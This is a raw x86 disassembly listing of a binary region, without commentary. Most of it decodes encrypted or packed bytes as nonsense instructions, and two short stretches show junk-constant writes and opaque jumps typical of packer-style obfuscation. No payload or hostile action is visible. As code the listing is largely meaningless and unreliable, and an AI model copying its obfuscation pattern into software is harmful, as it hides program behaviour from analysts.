  4061b5:	mov    cl,dl
  4061b7:	(bad)  
  4061b8:	cmp    eax,0x9b5cb038
  4061bd:	pusha  
  4061be:	bound  ecx,QWORD PTR ds:0x6f4ecbda
  4061c4:	dec    edx
  4061c5:	bound  edi,QWORD PTR [edi]
  4061c7:	shl    DWORD PTR [edi+0x66],cl
  4061ca:	adc    al,0x49
  4061cc:	es xor edx,ebp
  4061cf:	cmp    edx,ebp
  4061d1:	jge    0x4061cb
  4061d3:	jp     0x4061be
  4061d5:	jne    0x406249
  4061d7:	mov    al,ds:0x68cad0d7
  4061dc:	fimul  WORD PTR [ebx-0x67]
  4061df:	retf   
  4061e0:	or     dh,BYTE PTR [ebp-0x6178d3ed]
  4061e6:	scas   al,BYTE PTR es:[edi]
  4061e7:	sbb    edx,esp
  4061e9:	cmp    ebp,DWORD PTR [ebp+0x2b]
  4061ec:	test   eax,0x580153c0
  4061f1:	in     eax,0xfa
  4061f3:	dec    ecx
  4061f4:	(bad)  
  4061f6:	jo     0x40620b
  4061f8:	dec    ebp
  4061f9:	cmp    DWORD PTR [ecx],0xe030f54d
  4061ff:	and    eax,0x944b0ad1
  406204:	repnz mov dl,0x85
  406207:	aad    0x37
  406209:	std    
  40620a:	jge    0x406275
  40620c:	das    
  40620d:	mov    ch,0xf
  40620f:	xchg   ebp,eax
  406210:	pop    ds
  406211:	add    esi,DWORD PTR [eax-0x14aed220]
  406217:	sub    esp,DWORD PTR [ebx]
  406219:	cmp    ch,BYTE PTR [ebp-0x61]
  40621c:	pminub mm4,QWORD PTR [ecx]
  40621f:	aas    
  406220:	iret   
  406221:	mov    BYTE PTR [eax],bl
  406223:	test   eax,0xd3733ce3
  406228:	mov    esp,0x428dc48d
  40622d:	iret   
  40622e:	mov    esi,0xd674c858
  406233:	lock jl 0x40628b
  406236:	lods   eax,DWORD PTR ds:[esi]
  406237:	lea    eax,[esp+eax*2]
  40623a:	pop    ecx
  40623b:	and    BYTE PTR [esi],cl
  40623d:	test   BYTE PTR [edx],bh
  40623f:	mov    bh,0xab
  406241:	mov    bh,0xd7
  406243:	ds repz or al,0x59
  406247:	mov    DWORD PTR [edx-0x5b],edi
  40624a:	fsubr  QWORD PTR [edx]
  40624c:	fadd   DWORD PTR [esi+0x13]
  40624f:	xchg   edi,eax
  406250:	sbb    cl,ah
  406252:	outs   dx,BYTE PTR ds:[esi]
  406253:	mov    edi,0x5490037c
  406258:	dec    edi
  406259:	inc    edx
  40625a:	mov    edx,0x77f6b272
  40625f:	pop    eax
  406260:	bound  esp,QWORD PTR [edx-0x7a84b213]
  406266:	push   ebp
  406267:	or     eax,0x2ba9f810
  40626c:	jmp    FWORD PTR [eax+0x115d66c3]
  406272:	out    0xed,eax
  406274:	sbb    dh,BYTE PTR [ebx+eiz*8-0x8]
  406278:	std    
  406279:	inc    ebp
  40627a:	or     edx,DWORD PTR [eax+0x4d]
  40627d:	call   0x6571:0x56766e5b
  406284:	idiv   DWORD PTR [ebx+0x23]
  406287:	sbb    al,0x8d
  406289:	out    0x5d,eax
  40628b:	psubq  mm5,QWORD PTR [edi-0x689d411b]
  406292:	imul   ecx,DWORD PTR [ecx+0x52edfda0],0xfbde2b0d
  40629c:	fld    QWORD PTR [eax]
  40629e:	ins    DWORD PTR es:[edi],dx
  40629f:	sbb    eax,0x4ef5d8ba
  4062a4:	dec    eax
  4062a5:	sbb    ah,BYTE PTR [ebx+0x2dface42]
  4062ab:	xchg   esi,edi
  4062ad:	loop   0x4062c3
  4062af:	mov    ebp,0x84fc97c
  4062b4:	sbb    cl,BYTE PTR [ebx]
  4062b6:	inc    esp
  4062b7:	es jb  0x40631d
  4062ba:	sbb    BYTE PTR [eax],al
  4062bc:	sub    eax,0x92bbb0a0
  4062c1:	push   es
  4062c2:	dec    edx
  4062c3:	sub    al,0xcd
  4062c5:	loop   0x4062c4
  4062c7:	sbb    BYTE PTR [ecx+0x2482f428],0x43
  4062ce:	jp     0x40633a
  4062d0:	dec    ebp
  4062d1:	(bad)  
  4062d2:	repnz push edi
  4062d4:	ja     0x406320
  4062d6:	dec    ecx
  4062d7:	sub    eax,DWORD PTR fs:[edi+0x4c0a8af1]
  4062de:	not    BYTE PTR [ebx+edx*2+0x27]
  4062e2:	cmp    BYTE PTR [ebx-0x3f],bl
  4062e5:	test   DWORD PTR [edi-0x487d829d],esp
  4062eb:	shl    BYTE PTR [ecx],cl
  4062ed:	add    ah,BYTE PTR [ecx]
  4062ef:	mov    esi,0xfb688169
  4062f4:	leave  
  4062f5:	les    ebp,FWORD PTR [ebx]
  4062f7:	sbb    bh,dh
  4062f9:	test   DWORD PTR [edx+0x2d],esi
  4062fc:	inc    ecx
  4062fd:	jmp    0x8174b251
  406302:	mov    ebx,0x10f25a66
  406307:	adc    eax,0xa0356e28
  40630c:	(bad)  
  40630d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40630e:	jns    0x4062e1
  406310:	into   
  406311:	push   esp
  406312:	mov    ah,0x87
  406314:	in     al,0xbd
  406316:	sub    DWORD PTR [ebp+0x6b4e330a],0xffffffdf
  40631d:	ret    
  40631e:	jnp    0x406307
  406320:	dec    ebp
  406321:	out    0xb,eax
  406323:	and    eax,DWORD PTR [ebx]
  406325:	inc    eax
  406326:	adc    BYTE PTR [edi+0x3dd657e9],ah
  40632c:	pop    ds
  40632d:	cmp    eax,0x4ab14665
  406332:	jnp    0x4062d3
  406334:	jnp    0x4062cd
  406336:	dec    esp
  406337:	(bad)  
  406338:	pop    eax
  406339:	adc    dh,BYTE PTR [eax-0x7329481c]
  40633f:	daa    
  406340:	cmp    ah,dh
  406342:	adc    eax,0x428a819f
  406347:	xchg   esi,eax
  406348:	sub    BYTE PTR [eax],0xd2
  40634b:	push   eax
  40634c:	aam    0x82
  40634e:	pop    esp
  40634f:	je     0x4062ee
  406351:	xor    DWORD PTR [esi],esi
  406353:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406354:	inc    esi
  406355:	dec    edi
  406356:	cmp    al,0x35
  406358:	rcr    BYTE PTR [ebp+0x193fb6ee],cl
  40635e:	xchg   edi,eax
  40635f:	sbb    esp,DWORD PTR [eax+0x71614275]
  406365:	push   cs
  406366:	mov    ah,al
  406368:	cli    
  406369:	lods   eax,DWORD PTR ds:[esi]
  40636a:	cmp    DWORD PTR [ebx+0x15],0x544436d7
  406371:	pop    edx
  406372:	mov    dh,0xf1
  406374:	cmp    al,0x36
  406376:	rcl    DWORD PTR [edi-0x60],1
  406379:	out    0xb0,eax
  40637b:	push   eax
  40637c:	aaa    
  40637d:	je     0x406376
  40637f:	xchg   esi,eax
  406380:	jne    0x40631a
  406382:	stc    
  406383:	mov    edi,0x628cacec
  406388:	(bad)  
  406389:	xchg   edi,eax
  40638a:	push   0xffffff95
  40638c:	or     edi,ebp
  40638e:	xor    bh,BYTE PTR [esi-0x90a1424]
  406394:	jl     0x4063cf
  406396:	sub    BYTE PTR [esi-0x5fa0d269],0x7e
  40639d:	and    DWORD PTR [esi],0x74c52c1
  4063a3:	add    edi,ecx
  4063a5:	add    bl,BYTE PTR [ecx]
  4063a7:	scas   al,BYTE PTR es:[edi]
  4063a8:	outs   dx,BYTE PTR ds:[esi]
  4063a9:	adc    ch,ch
  4063ab:	enter  0xaf0b,0xfb
  4063af:	arpl   WORD PTR [edx-0x11],si
  4063b2:	mov    esi,0x365073fb
  4063b7:	call   0xbd8bb8b1
  4063bc:	xlat   BYTE PTR ds:[ebx]
  4063bd:	aam    0x3
  4063bf:	inc    edx
  4063c0:	ret    0x313d
  4063c3:	jg     0x4063a8
  4063c5:	pop    ebp
  4063c6:	and    bh,dl
  4063c8:	pop    edi
  4063c9:	stos   BYTE PTR es:[edi],al
  4063ca:	mov    ebx,0x76a5aeed
  4063cf:	xchg   edx,eax
  4063d0:	scas   eax,DWORD PTR es:[edi]
  4063d1:	sar    BYTE PTR [eax+0x60],cl
  4063d4:	mov    cl,0x45
  4063d6:	ins    DWORD PTR es:[edi],dx
  4063d7:	pop    esi
  4063d8:	dec    edx
  4063d9:	mov    ds:0x4a1906b,eax
  4063de:	dec    edx
  4063df:	lods   al,BYTE PTR ds:[esi]
  4063e0:	jmp    0x406405
  4063e2:	in     al,dx
  4063e3:	cmp    eax,0x2e263878
  4063e8:	fisttp DWORD PTR [esi]
  4063ea:	inc    ecx
  4063eb:	aam    0x9a
  4063ed:	js     0x4063ed
  4063ef:	lahf   
  4063f0:	sub    eax,0xec996eb
  4063f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4063f6:	sub    bl,BYTE PTR [ecx]
  4063f8:	outs   dx,DWORD PTR ds:[si]
  4063fa:	rcr    dl,cl
  4063fc:	sti    
  4063fd:	and    cl,BYTE PTR [esi+0x6b]
  406400:	enter  0x564,0x72
  406404:	pop    edi
  406405:	(bad)  
  406406:	push   ebx
  406407:	and    al,0x60
  406409:	and    al,0x95
  40640b:	sub    eax,0xf45c854d
  406410:	mov    WORD PTR [edx-0x35],?
  406413:	pushf  
  406414:	add    eax,0xb1374563
  406419:	mov    esp,0x47651c3e
  40641e:	iret   
  40641f:	ja     0x406423
  406421:	jbe    0x405c26
  406427:	pop    ebx
  406428:	mov    eax,0xf89c8532
  40642d:	pop    edi
  40642e:	pop    esi
  40642f:	leave  
  406430:	ret    0xc
  406433:	push   ebp
  406434:	mov    ebp,esp
  406436:	mov    eax,ds:0x41222c
  40643b:	add    DWORD PTR ds:0x430606,edi
  406441:	mov    edx,0x32729d
  406446:	xor    ecx,DWORD PTR ds:0x42e8e2
  40644c:	sub    eax,edx
  40644e:	inc    DWORD PTR ds:0x430612
  406454:	mov    ecx,0x7510856
  406459:	push   esi
  40645a:	sbb    DWORD PTR ds:0x430632,0x57eb
  406464:	mov    esi,DWORD PTR [ebp+0xc]
  406467:	xor    eax,ecx
  406469:	mov    DWORD PTR ds:0x42ef8c,0x533d
  406473:	cmp    eax,esi
  406475:	mov    DWORD PTR ds:0x42e8e2,0x3465
  40647f:	je     0x406fac
  406485:	mov    eax,ds:0x412224
  40648a:	dec    DWORD PTR ds:0x42e8da
  406490:	jmp    0x40681a
  406495:	fcmovnb st,st(7)
  406497:	dec    esi
  406498:	fild   WORD PTR [edx+0x57]
  40649b:	jnp    0x406498
  40649d:	(bad)  
  40649e:	cmp    ebx,DWORD PTR [esi*8+0x5ad6ddaf]
  4064a5:	fidiv  WORD PTR [ebx]
  4064a7:	jle    0x406527
  4064a9:	jmp    0x40651c
  4064ab:	jle    0x40652b
  4064ad:	mov    ebp,ebx
  4064af:	popf   
  4064b0:	push   esp
  4064b1:	xchg   DWORD PTR [edx+0x1afc08e1],edx
  4064b7:	push   0x24857f9d
  4064bc:	jnp    0x4064ca
  4064be:	mov    ah,0xb5
  4064c0:	sbb    ch,BYTE PTR [esi+0x63090d7e]
  4064c6:	adc    eax,0xc7b1af8
  4064cb:	inc    edi
  4064cc:	shr    BYTE PTR [edi],1
  4064ce:	pop    edi
  4064cf:	in     al,dx
  4064d0:	xchg   BYTE PTR [ebp+ebp*4+0x7c3390ae],dh
  4064d7:	cmp    ebx,ebp
  4064d9:	mov    ah,0x77
  4064db:	outs   dx,BYTE PTR ds:[esi]
  4064dc:	mov    ds:0xf47e6fb3,al
  4064e1:	cli    
  4064e2:	ins    DWORD PTR es:[edi],dx
  4064e3:	xchg   ecx,eax
  4064e4:	mov    ds:0x2a4ae14e,eax
  4064e9:	pop    ebx
  4064ea:	jle    0x406485
  4064ec:	xor    al,0xeb
  4064ee:	mov    ebx,0xaa53b5eb
  4064f3:	ins    BYTE PTR es:[edi],dx
  4064f4:	fsub   QWORD PTR [edi-0x13]
  4064f7:	sub    edx,0xffffffb9
  4064fa:	jne    0x406538
  4064fc:	adc    eax,DWORD PTR [eax+0x55903633]
  406502:	cmp    al,0x8f
  406504:	stos   BYTE PTR es:[edi],al
  406505:	pop    ds
  406506:	int3   
  406507:	push   ds
  406508:	lahf   
  406509:	dec    edx
  40650a:	push   0xdacf118a
  40650f:	pop    ebp
  406510:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406511:	in     al,0x93
  406513:	leave  
  406514:	dec    ebx
  406515:	inc    ecx
  406516:	popf   
  406517:	mov    ecx,0x438274a2
  40651c:	push   ds
  40651d:	retf   0x1481
  406520:	mov    eax,esp
  406522:	mov    eax,ds:0x1b984cf5
  406527:	add    DWORD PTR ds:0xc0d124e5,ebp
  40652d:	pop    ss
  40652e:	jge    0x406580
  406530:	push   eax
  406531:	ret    
  406532:	pop    ss
  406533:	inc    ebx
  406534:	adc    ecx,edx
  406536:	jne    0x406510
  406538:	inc    BYTE PTR [esi-0x6e1b90b2]
  40653e:	and    DWORD PTR [eax*8+0x4d1ffba1],0xce0775ad
  406549:	repz xor BYTE PTR [edi+0x5e],cl
  40654d:	cld    
  40654e:	jns    0x4065ba
  406550:	sub    al,0x22
  406552:	mov    edi,0x4a56d2b7
  406558:	(bad)  
  406559:	repnz pusha 
  40655b:	sbb    esi,DWORD PTR [edi-0x4d8d56b4]
  406561:	(bad)  
  406562:	leave  
  406563:	push   ebx
  406564:	scas   al,BYTE PTR es:[edi]
  406565:	or     eax,ebx
  406567:	sub    DWORD PTR [ebx-0x485d43e3],ebp
  40656d:	push   ds
  40656e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40656f:	out    dx,eax
  406570:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406571:	bound  esp,QWORD PTR [edx]
  406573:	sub    eax,0x26bce014
  406578:	xchg   edx,eax
  406579:	and    edi,DWORD PTR [edx-0x1d]
  40657c:	cmp    al,0xcd
  40657e:	ret    
  40657f:	iret   
  406580:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406581:	mov    esp,0x67825e55
  406586:	sub    DWORD PTR ds:0x5047b4bc,ebx
  40658c:	ds or  al,0xc2
  40658f:	jecxz  0x4065e7
  406591:	xor    al,0x66
  406593:	stos   BYTE PTR es:[edi],al
  406594:	add    ch,BYTE PTR ds:[ecx+0x0]
  406598:	aas    
  406599:	xchg   BYTE PTR [edi],ch
  40659b:	lea    ebp,[edi]
  40659d:	xchg   esi,eax
  40659e:	xchg   edx,eax
  40659f:	inc    eax
  4065a0:	imul   edi,ebx,0xd611acdc
  4065a6:	mov    al,ds:0x11311b3a
  4065ab:	cmc    
  4065ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4065ad:	push   ebp
  4065ae:	inc    esi
  4065af:	dec    ebp
  4065b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4065b1:	jbe    0x4065ad
  4065b3:	ins    DWORD PTR es:[edi],dx
  4065b4:	retf   0x8c1b
  4065b7:	cmp    BYTE PTR [eax+0x11360d32],ah
  4065bd:	inc    eax
  4065be:	cmp    esi,edx
  4065c0:	push   ebx
  4065c1:	and    eax,DWORD PTR [ecx]
  4065c3:	daa    
  4065c4:	mov    eax,ds:0xf4c03d6a
  4065c9:	(bad)  
  4065ca:	sub    eax,0xcb4b812c
  4065cf:	xchg   esp,ebp
  4065d1:	dec    ecx
  4065d2:	fld    TBYTE PTR [ebx-0x2fceccc9]
  4065d8:	jno    0x406561
  4065da:	(bad)  
  4065db:	push   edi
  4065dc:	ror    esp,0xf2
  4065df:	xor    cl,BYTE PTR [ebx-0x6c]
  4065e2:	mov    dl,0xfd
  4065e4:	push   esi
  4065e5:	mov    ds:0x1cbfd02d,al
  4065ea:	out    dx,al
  4065eb:	test   al,0xdf
  4065ed:	cwde   
  4065ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4065ef:	out    dx,eax
  4065f0:	inc    ebp
  4065f1:	sbb    DWORD PTR [esi+edx*4-0x18],esi
  4065f5:	rcl    DWORD PTR [esi+0x16e79d2c],0xdd
  4065fc:	inc    ebx
  4065fd:	in     al,0xda
  4065ff:	sbb    al,0x97
  406601:	xor    DWORD PTR [ebx-0x4793f1d],ecx
  406607:	dec    ebx
  406608:	jmp    0x406594
  40660a:	xchg   ecx,eax
  40660b:	out    0x52,al
  40660d:	test   al,0xf8
  40660f:	sbb    al,0x3b
  406611:	wrmsr  
  406613:	call   0x89881201
  406618:	add    esp,esi
  40661a:	(bad)  
  40661b:	fisubr DWORD PTR [edi-0x61]
  40661e:	dec    esp
  40661f:	sbb    eax,0x616f54e4
  406624:	pusha  
  406625:	or     esp,eax
  406627:	mov    ebx,0xbde66f5b
  40662c:	xchg   esp,eax
  40662d:	dec    esi
  40662e:	mov    ds:0x8d4b2c81,al
  406633:	sbb    cl,BYTE PTR [ebp+ebp*2+0x4a9cd1a7]
  40663a:	(bad)  
  40663c:	mov    bh,0xef
  40663e:	xor    eax,0xc7f84313
  406643:	fadd   QWORD PTR [ebx+0x10]
  406646:	sbb    esp,ebp
  406648:	dec    eax
  406649:	jnp    0x4066aa
  40664b:	sub    edx,DWORD PTR [ebx+ebp*2+0x33cbc871]
  406652:	fisttp WORD PTR [ecx-0x69]
  406655:	xor    edi,DWORD PTR [edi]
  406657:	in     eax,0x3c
  406659:	call   0xc45f13da
  40665e:	sub    al,0xf
  406660:	or     al,0x78
  406662:	push   esp
  406663:	dec    edx
  406664:	mov    al,ch
  406666:	cmp    edx,edx
  406668:	int3   
  406669:	push   ss
  40666a:	cmp    edx,esp
  40666c:	retf   0xf6e2
  40666f:	mov    ds:0xd0d8b1d2,eax
  406674:	xchg   DWORD PTR [ebx-0x6db387f],ebp
  40667a:	or     DWORD PTR [eax-0x72ee35b6],0xffffffa1
  406681:	jnp    0x4066f3
  406683:	imul   eax,esp,0x4e
  406686:	test   dl,0xe6
  406689:	dec    esp
  40668a:	ss xor dh,ah
  40668d:	inc    esp
  40668e:	rcr    cl,0x45
  406691:	sbb    DWORD PTR [edi],ebx
  406693:	cli    
  406694:	push   es
  406695:	add    al,0x97
  406697:	fnstenv [esi]
  406699:	fimul  DWORD PTR [ebx-0x3e1a612d]
  40669f:	call   0x9352:0x75fe2571
  4066a6:	call   0x404f:0xcfabd4bd
  4066ad:	jg     0x406728
  4066af:	(bad)  [esi]
  4066b1:	mov    dh,0x3c
  4066b3:	into   
  4066b4:	sub    ecx,DWORD PTR [eax-0x7d]
  4066b7:	outs   dx,DWORD PTR ds:[esi]
  4066b8:	adc    eax,0x585892fd
  4066bd:	adc    ah,ch
  4066bf:	cmp    bh,BYTE PTR [esi-0x6e]
  4066c2:	mov    ah,0xf2
  4066c4:	mov    esi,0xa154d9be
  4066c9:	js     0x406701
  4066cb:	and    al,0x97
  4066cd:	cld    
  4066ce:	scas   al,BYTE PTR es:[edi]
  4066cf:	addr16 pop edi
  4066d2:	xchg   ebp,eax
  4066d3:	es push cs
  4066d5:	jne    0x4066e5
  4066d7:	loop   0x4066ee
  4066d9:	in     al,0x64
  4066db:	loope  0x406740
  4066dd:	or     al,0x29
  4066df:	push   esi
  4066e0:	adc    ecx,DWORD PTR [ebp-0x146493d3]
  4066e6:	mov    ebp,0x4d6b8b23
  4066eb:	push   esp
  4066ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4066ed:	call   0xfd664f70
  4066f2:	stc    
  4066f3:	cmp    ecx,DWORD PTR [edx+0x19]
  4066f6:	push   edi
  4066f7:	add    DWORD PTR [esi-0x7385389c],0xc494174d
  406701:	popf   
  406702:	aam    0xbb
  406704:	sar    bh,cl
  406706:	ror    BYTE PTR [edi+ebp*8-0x37d3a436],cl
  40670d:	mov    dh,0x3a
  40670f:	adc    DWORD PTR [ebx-0x4c],ebx
  406712:	mov    ds:0xec0a2e08,eax
  406717:	jg     0x4066f7
  406719:	add    eax,0xd976bcf0
  40671e:	cmp    DWORD PTR ds:0x7f514ab1,ebp
  406724:	xor    eax,0x1c68521
  406729:	dec    ebp
  40672a:	leave  
  40672b:	jb     0x406708
  40672d:	xchg   ebp,eax
  40672e:	hlt    
  40672f:	ins    DWORD PTR es:[edi],dx
  406730:	inc    esp
  406732:	mov    esi,0x6666ed7d
  406737:	xchg   esi,eax
  406738:	fst    DWORD PTR [ebx+0x22]
  40673b:	mov    eax,ds:0xf5fe529a
  406740:	inc    esp
  406741:	and    bl,BYTE PTR [esi+0x9e869e]
  406747:	shr    BYTE PTR [esi+esi*8+0xf186358],cl
  40674e:	das    
  40674f:	mov    edi,0xe15582
  406754:	mov    eax,0xdc7898fa
  406759:	push   esi
  40675a:	imul   eax,DWORD PTR [esi-0x3d],0xffffff8a
  40675e:	enter  0x3b93,0x7f
  406762:	imul   edx,DWORD PTR [ecx-0x53807734],0x24a79d1e
  40676c:	fnsave [eax+ecx*1]
  40676f:	and    esp,DWORD PTR [esi]
  406771:	mov    ecx,0xd43ad9da
  406776:	xchg   edi,eax
  406777:	jecxz  0x4067d6
  406779:	sbb    DWORD PTR [ebx-0x36],eax
  40677c:	jb     0x406796
  40677e:	and    eax,0x87e91c2c
  406783:	dec    ebp
  406784:	xor    cl,cl
  406786:	out    dx,eax
  406787:	sbb    DWORD PTR [ebx+ebp*1],eax
  40678a:	jp     0x4067e0
  40678c:	xlat   BYTE PTR ds:[ebx]
  40678d:	enter  0xb770,0xca
  406791:	imul   edx,esi,0x279bb9e4
  406797:	mov    ecx,0xc1553c36
  40679c:	add    dh,cl
  40679e:	in     eax,dx
  40679f:	lahf   
  4067a0:	test   BYTE PTR [esi],bh
  4067a2:	popf   
  4067a3:	call   0xb5ad:0xeef3752
  4067aa:	mov    WORD PTR [esi],?
  4067ac:	fyl2x  
  4067ae:	rcl    BYTE PTR [edi+eiz*1],cl
  4067b1:	xor    BYTE PTR [ecx*1+0xe553249],dh
  4067b8:	dec    edi
  4067b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4067ba:	out    dx,al
  4067bb:	pop    edi
  4067bc:	(bad)  
  4067be:	jmp    0x4067a9
  4067c0:	(bad)  
  4067c1:	mov    eax,ds:0x420b9571
  4067c6:	(bad)  
  4067c7:	cld    
  4067c8:	adc    al,0x1a
  4067ca:	pop    ecx
  4067cb:	ss daa 
  4067cd:	idiv   BYTE PTR [ebp+0x720d8aad]
  4067d3:	mov    ebp,0xc85a0175
  4067d8:	pop    edi
  4067d9:	mov    bh,0x79
  4067db:	xor    eax,0x502f8e4d
  4067e0:	mov    eax,0x83fe44fd
  4067e5:	scas   eax,DWORD PTR es:[edi]
  4067e6:	mov    al,0xf8
  4067e8:	leave  
  4067e9:	jo     0x406861
  4067eb:	dec    ebp
  4067ec:	mov    BYTE PTR [edi-0x5c71ba0e],bh
  4067f2:	mov    al,ds:0xad3b9321
  4067f7:	lods   al,BYTE PTR ds:[esi]
  4067f8:	fisub  WORD PTR [ecx+ebx*8]
  4067fb:	fmulp  st(2),st
  4067fd:	into   
  4067fe:	jecxz  0x4067cc
  406800:	sub    BYTE PTR [eax-0x392a9cca],bl
  406806:	bound  esp,QWORD PTR [edx+0x64eb8125]
  40680c:	dec    ebx
  40680d:	push   0xffffffa8
  40680f:	cmc    
  406810:	and    eax,0x59773176
  406815:	sbb    DWORD PTR [esi-0x74db1989],esp
  40681b:	jne    0x406829
  40681d:	sbb    DWORD PTR ds:0x42efa4,0x43062a
  406827:	sub    eax,edx
  406829:	xor    eax,ecx
  40682b:	mov    DWORD PTR ds:0x4306d2,0x4727
  406835:	cmp    eax,esi
  406837:	mov    DWORD PTR ds:0x42ef9c,0x846
  406841:	jne    0x406867
  406847:	add    eax,DWORD PTR ds:0x4306be
  40684d:	mov    eax,ds:0x41222c
  406852:	add    eax,DWORD PTR ds:0x412224
  406858:	mov    DWORD PTR ds:0x43063a,0x6a19
  406862:	jmp    0x406878
  406867:	mov    eax,DWORD PTR [ebp+0xc]
  40686a:	xor    DWORD PTR ds:0x4306d6,0x43061a
  406874:	xor    eax,ecx
  406876:	add    eax,edx
  406878:	mov    DWORD PTR ds:0x42efa4,0x1bc3
  406882:	jmp    0x406c0c
  406887:	xchg   BYTE PTR [ecx],dh
  406889:	fcmove st,st(5)
  40688b:	pop    ebp
  40688c:	fstp   QWORD PTR [ecx-0x3833e0bb]
  406892:	dec    esi
  406893:	cdq    
  406894:	push   ebx
  406895:	bndstx [ebx+0x36],bnd1
  406899:	jle    0x406919
  40689b:	jmp    0x40690e
  40689d:	jle    0x40691d
  40689f:	inc    ebx
  4068a0:	in     eax,0xf7
  4068a2:	sbb    eax,0x126fb599
  4068a7:	xor    DWORD PTR [edi+0x37],edi
  4068aa:	test   BYTE PTR [eax+0x693be0f8],dh
  4068b0:	jmp    0xf70be646
  4068b5:	inc    ebp
  4068b6:	adc    BYTE PTR [ebx-0x2a9447a7],dl
  4068bc:	imul   esp,eax,0xffffffc9
  4068bf:	dec    ebx
  4068c0:	sbb    bl,BYTE PTR [edi+edi*4+0x39]
  4068c4:	fsubr  QWORD PTR [ebx-0x6a800a80]
  4068ca:	xchg   edx,ebx
  4068cc:	jp     0x4068c2
  4068ce:	fstp   TBYTE PTR [ebp+0x4]
  4068d1:	pop    ss
  4068d2:	scas   al,BYTE PTR es:[edi]
  4068d3:	and    edx,DWORD PTR [esi+0x3e]
  4068d6:	adc    edx,DWORD PTR [esi]
  4068d8:	add    esp,DWORD PTR fs:[esi-0x28]
  4068dc:	dec    edx
  4068dd:	cdq    
  4068de:	stos   BYTE PTR es:[edi],al
  4068df:	xchg   esp,eax
  4068e0:	or     ecx,ecx
  4068e2:	mov    bh,0x73
  4068e4:	mov    bl,0x2c
  4068e6:	retf   
  4068e7:	ins    DWORD PTR es:[edi],dx
  4068e8:	mov    bl,0xb8
  4068ea:	int3   
  4068eb:	pop    ds
  4068ec:	dec    ecx
  4068ed:	mov    edi,0x6e6d30e6
  4068f2:	push   esi
  4068f3:	dec    ebp
  4068f4:	sti    
  4068f5:	inc    esi
  4068f6:	test   al,0x1c
  4068f8:	imul   edi,DWORD PTR [edx-0x3c],0x62
  4068fc:	fbstp  TBYTE PTR [eax-0x4a518679]
  406902:	ds in  al,0x86
  406905:	int    0xe4
  406907:	pop    es
  406908:	sub    esi,DWORD PTR [esi+ebx*2+0x10]
  40690c:	jle    0x406949
  40690e:	inc    ebp
  40690f:	xchg   esi,eax
  406910:	ins    BYTE PTR es:[edi],dx
  406911:	mov    esi,0xf8a45a05
  406916:	jbe    0x406938
  406918:	shr    DWORD PTR [esi],cl
  40691a:	push   ds
  40691b:	in     al,0xa5
  40691d:	repnz inc ebx
  40691f:	retf   
  406920:	nop
  406921:	mov    bh,0x9b
  406923:	imul   BYTE PTR [ebx+eax*1]
  406926:	sub    BYTE PTR [esi],bl
  406928:	push   esp
  406929:	add    BYTE PTR [eax-0x24acbbb2],bl
  40692f:	xchg   ebx,eax
  406930:	mov    DWORD PTR [edx+0x65],ebp
  406933:	or     BYTE PTR [ebp+eiz*8+0x61],ch
  406937:	cmc    
  406938:	call   0xae7f:0x2a747a4a
  40693f:	mov    edi,ecx
  406941:	cli    
  406942:	in     eax,0x64
  406944:	test   DWORD PTR [esi-0x5e],esi
  406947:	mov    edx,0x994faca8
  40694c:	mov    ah,0x1a
  40694e:	cli    
  40694f:	addr16 test al,0x9c
  406952:	xlat   BYTE PTR ds:[ebx]
  406953:	xlat   BYTE PTR ds:[ebx]
  406954:	in     al,0x99
  406956:	aam    0xea
  406958:	xlat   BYTE PTR ds:[ebx]
  406959:	inc    esi
  40695a:	push   0xffffffd9
  40695c:	into   
  40695d:	in     al,dx
  40695e:	inc    edi
  40695f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406960:	sbb    DWORD PTR [eax+0x3c2a2670],esi
  406966:	loop   0x406946
  406968:	test   DWORD PTR [edx+0x35],eax
  40696b:	rol    ah,cl
  40696d:	imul   esp,DWORD PTR [ecx+0x6e],0xa4b069e5
  406974:	aas    
  406975:	repz rol DWORD PTR [ebp-0xe042b13],0x81
  40697d:	fld    TBYTE PTR [edx-0x1b]
  406980:	or     eax,0x5d097560
  406985:	fsub   QWORD PTR [ecx]
  406987:	xor    al,0xd3
  406989:	test   BYTE PTR [edx-0x64],dh
  40698c:	js     0x406925
  40698e:	sub    ah,0xc8
  406991:	les    ebx,FWORD PTR [edx+0x41ee33ed]
  406997:	or     BYTE PTR [ebx+0x7a5053a6],ch
  40699d:	mov    dh,0xa9
  40699f:	(bad)  
  4069a0:	xor    ebx,eax
  4069a2:	add    DWORD PTR [eax+ecx*2],edi
  4069a5:	jecxz  0x406a20
  4069a7:	sub    al,0xf8
  4069a9:	sub    al,0x8a
  4069ab:	jecxz  0x4069f9
  4069ad:	or     dl,BYTE PTR [ecx]
  4069af:	jns    0x406a18
  4069b1:	lea    edx,[esi]
  4069b3:	leave  
  4069b4:	inc    esi
  4069b5:	gs aas 
  4069b7:	call   0xa4b21a31
  4069bc:	out    0xe,eax
  4069be:	add    al,0xae
  4069c0:	pop    ecx
  4069c1:	repnz rol DWORD PTR [eax],cl
  4069c4:	sbb    eax,0xe8c6b927
  4069c9:	(bad)  
  4069cb:	inc    ecx
  4069cc:	mov    ch,0x54
  4069ce:	jmp    0x40697b
  4069d0:	div    DWORD PTR [edi+0x6308ea32]
  4069d6:	sbb    al,0xf8
  4069d8:	xchg   ebx,eax
  4069d9:	pop    ebx
  4069da:	xlat   BYTE PTR ds:[ebx]
  4069db:	and    BYTE PTR [ecx-0x34],dh
  4069de:	hlt    
  4069df:	push   0xe1c6a137
  4069e4:	mov    bl,0xb2
  4069e6:	xor    eax,0x683c3389
  4069eb:	sbb    al,0x7c
  4069ed:	ret    0x5641
  4069f0:	pop    eax
  4069f1:	cmp    BYTE PTR [ebp-0x7220d0d1],bh
  4069f7:	pop    ecx
  4069f8:	hlt    
  4069f9:	mov    bh,0xe0
  4069fb:	mov    edi,0xf531ef11
